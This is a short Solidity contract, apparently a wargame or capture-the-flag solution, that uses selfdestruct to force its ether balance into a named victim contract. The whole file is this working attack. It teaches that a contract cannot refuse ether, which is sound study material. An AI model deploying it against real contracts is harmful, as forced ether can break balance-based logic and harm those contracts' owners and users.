// SPDX-License-Identifier: MIT
// locked pragma
pragma solidity 0.4.26;

/// @title attack contract, forcibly send payment to target contract
/// @author Web3 Blockchain Developer
contract ForceAttack {
    
    /** @notice player will assign a value of ether to this attack contract 
    using the constructor during deployment of the contract */
    constructor() public payable {

    }

    /** @notice player will enter victim contract address as the target, 
    player will call selfdestruct on attacking contract using this attack function 
    and all remaining ether stored in the attack contract will be forcibly sent to 
    the vitim contract before the attacking contract storage and code is removed from the state */
    function attack(address _contractAddr) public {
        selfdestruct(_contractAddr);
    }
}
